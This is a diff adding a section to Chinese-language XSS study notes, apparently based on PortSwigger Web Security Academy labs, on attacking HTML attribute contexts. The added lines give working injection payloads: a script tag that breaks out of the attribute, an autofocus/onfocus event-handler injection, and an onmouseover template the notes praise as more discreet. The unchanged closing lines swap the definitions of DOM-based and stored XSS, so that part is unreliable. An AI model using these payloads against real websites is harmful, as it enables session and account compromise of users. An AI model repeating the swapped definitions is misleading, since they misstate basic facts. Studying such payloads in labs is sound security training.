@@ -151,6 +151,21 @@ https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+
 <svg><animatetransform onbegin=alert(1)></svg>
 ```
 ##### （2）HTML 标签属性中的 XSS
-
+`当 XSS 上下文位于 HTML 标记属性值中时，有时您可能能够终止属性值、关闭标记并引入新属性值。例如：`<br/>
+```
+"><script>alert(document.domain)</script>
+```
+`在这种情况下更常见的是，尖括号被阻止或编码，因此您的输入无法脱离它出现的标签。只要您可以终止属性值，通常就可以引入一个可创建脚本化上下文的新属性，例如事件处理程序。例如：`<br/>
+```
+" autofocus onfocus=alert(document.domain) x="
+```
+###### 尖括号被html实体化编码
+![image](https://github.com/user-attachments/assets/e2ec1ba2-5b50-4218-82bb-c7b7318c96ed)
+```
+1、首先闭合value
+2、寻找合适的事件属性，像onmouseover/onclick/onfocus等，但是相比其他，onmouseover成功几率搞，因为更自然隐蔽
+payload example：
+"onmouseover/onclick/onfocus="javascript:alert(1)
+```
 ### (2) DOM型XSS -- 恶意脚本来自网站的数据库
 ### (3) 存储型XSS -- 漏洞存在于客户端代码中，而不是服务器端代码中。
